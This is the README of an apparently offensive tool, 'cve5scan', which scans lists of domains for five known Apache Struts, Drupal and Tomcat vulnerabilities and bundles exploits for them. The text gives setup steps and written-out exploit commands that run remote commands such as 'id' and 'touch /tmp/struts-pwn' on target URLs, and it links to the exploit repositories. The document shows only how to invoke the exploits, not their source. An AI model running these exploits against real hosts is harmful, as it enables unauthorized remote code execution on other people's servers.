*cve5scan*
==========
### 5 CVE scan and exploit
The mission of this program  the
Scanning list of domain from 5
known security vulnerabilities listed with the source below

# **Use** #
*Installation :* 

`sudo chmod +x setup.sh`

`sudo chmod +x cve5scan.sh`
               
`./setup.sh`

`Run: ./cve5scan.sh <domainlist.txt>`

If there is a result, it is stored in a output folder

![alt text](https://raw.githubusercontent.com/raoufmaklouf/cve5scan/master/Screenshot%20at%202020-02-05%2013-40-55.jpg)


# **exploit** #
*CVE-2017-5638 :* `python cve/struts-pwn/struts-pwn.py --url 'http://example.com/struts2-showcase/index.action' -c 'id'`

read more: cve/struts-pwn/README.md & https://github.com/mazen160/struts-pwn

*CVE-2017-9805 :* `python cve/struts-pwn_CVE-2017-9805/struts-pwn.py --exploit --url 'http://example.com/struts2-rest-showcase/orders/3' -c 'touch /tmp/struts-pwn'`

read more: cve/struts-pwn_CVE-2017-9805/README.md & https://github.com/mazen160/struts-pwn_CVE-2017-9805

*CVE-2018-11776 :* `python cve/struts-pwn_CVE-2018-11776/struts-pwn.py --exploit --url 'http://example.com/demo/struts2-showcase/index.action' -c 'id'`

read more: cve/struts-pwn_CVE-2018-11776/README.md & https://github.com/mazen160/struts-pwn_CVE-2018-11776

*CVE-2018-7600 :* `ruby cve/Drupalgeddon2-CVE-2018-7600.rb https://example.com`

read more: https://github.com/dreadlocked/Drupalgeddon2/


*CVE-2017-12617 :* `python cve/Tomcat-CVE-2017-12617.py -u http://example.com`

read more: https://github.com/cyberheartmi9/CVE-2017-12617

### CVE Supported ###
--struts-pwn :`CVE-2017-5638`   source: https://github.com/mazen160/struts-pwn

--struts-pwn :`CVE-2017-9805`   source: https://github.com/mazen160/struts-pwn_CVE-2017-9805

--struts-pwn :`CVE-2018-11776`  source: https://github.com/mazen160/struts-pwn_CVE-2018-11776

--Drupal     :`CVE-2018-7600`   source: https://github.com/dreadlocked/Drupalgeddon2/

--tomcat     :`CVE-2017-12617`  source: https://github.com/cyberheartmi9/CVE-2017-12617


# **Author** #
*raouf maklouf*
* Facebook: [https://www.facebook.com/raouf.maklouf]
* Linkedin: [https://www.linkedin.com/in/raouf-maklouf-505a061a0/]
